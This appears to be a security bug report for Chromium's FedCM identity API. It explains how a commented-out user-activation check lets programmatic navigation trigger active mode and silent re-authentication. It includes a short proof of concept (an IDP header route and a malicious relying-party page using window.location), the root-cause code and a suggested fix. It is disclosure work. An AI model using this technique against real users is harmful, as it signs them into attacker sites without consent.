# VRP Report: FedCM Navigation Interception Treats All Navigations as User-Activated

## Title

DidNavigationHandleHaveActivation() always returns true — FedCM active mode usable without user gesture via programmatic navigation

## Severity

Medium-High (User activation bypass in credential API, no compromised renderer)

## Component

Blink > Identity > FedCM

## Chrome Version

Tested against Chromium source at HEAD (April 2026).

## Summary

The function `DidNavigationHandleHaveActivation()` in FedCM's `webid_utils.cc` is intended to verify that a navigation was initiated by a genuine user gesture. Instead, it unconditionally returns `true` whenever a `NavigationHandle*` is non-null (which it always is in practice). The actual user activation check (`handle->StartedWithTransientActivation()`) is commented out. This allows programmatic navigations to trigger FedCM active mode, bypassing permission embargo and enabling silent auto-reauthn.

## Steps to Reproduce

### Step 1: Set up IDP to respond with FedCM headers

```python
# IDP server at https://idp.example
@app.route('/auth')
def auth():
    response = make_response('', 302)
    response.headers['Federation-Initiate-Request'] = 'yes'
    return response
```

### Step 2: Malicious RP triggers programmatic navigation

```html
<!-- https://evil-rp.example/login.html -->
<script>
// NO user click needed - programmatic navigation
window.location = 'https://idp.example/auth?client_id=evil-rp.example';

// The navigation interceptor will:
// 1. Intercept this navigation (it has Federation-Initiate-Request header)
// 2. Call DidNavigationHandleHaveActivation(handle) -> returns true
// 3. Set had_transient_user_activation_ = true
// 4. Fire FedCM request in active mode

// Active mode effects:
// - Bypasses permission status check (CanBypassPermissionStatusCheck returns true)
// - Enables auto-reauthn for returning accounts
// - Enables continuation popups
</script>
```

### Step 3: Observe silent authentication

If the user has previously authenticated with `idp.example` and has a returning account, the auto-reauthn flow can fire automatically, authenticating the user to `evil-rp.example` without any user gesture.

## Root Cause

```cpp
// content/browser/webid/webid_utils.cc:471-478
bool DidNavigationHandleHaveActivation(NavigationHandle* handle) {
  return handle != nullptr;
  // TODO(crbug.com/477971553): re-enable the waiving of the user activation
  // requirement outside of agentic mode. The following criteria [1] isn't
  // working as we expected, specifically when redirects are happening inside
  // of pop-up windows.
  // [1] handle->StartedWithTransientActivation()
}
```

This function is called in two places:
1. `request_service.cc:355-358` — Sets `had_transient_user_activation_`
2. `navigation_interceptor.cc:100` — Decides whether to intercept navigation

## Expected Result

`DidNavigationHandleHaveActivation` should return `handle->StartedWithTransientActivation()` to ensure only user-initiated navigations trigger FedCM active mode.

## Actual Result

Returns `handle != nullptr` (always true), treating all navigations as user-activated.

## Security Impact

1. **User activation bypass**: FedCM active mode available without user gesture
2. **Permission embargo bypass**: `CanBypassPermissionStatusCheck` returns true in active mode, skipping previous user dismissal tracking
3. **Silent auto-reauthn**: Returning accounts can be silently authenticated
4. **No compromised renderer required**: Programmatic navigation (`window.location`) is standard web API
5. **Known issue**: crbug.com/477971553, but the dead code remains active

## Suggested Fix

Re-enable the activation check:
```cpp
bool DidNavigationHandleHaveActivation(NavigationHandle* handle) {
  return handle != nullptr && handle->StartedWithTransientActivation();
}
```

Or if redirect handling is the issue, add specific logic for redirects while still requiring initial user activation.

## PoC

Inline above. The key observation: `webid_utils.cc:472` returns `handle != nullptr` instead of checking `handle->StartedWithTransientActivation()`.
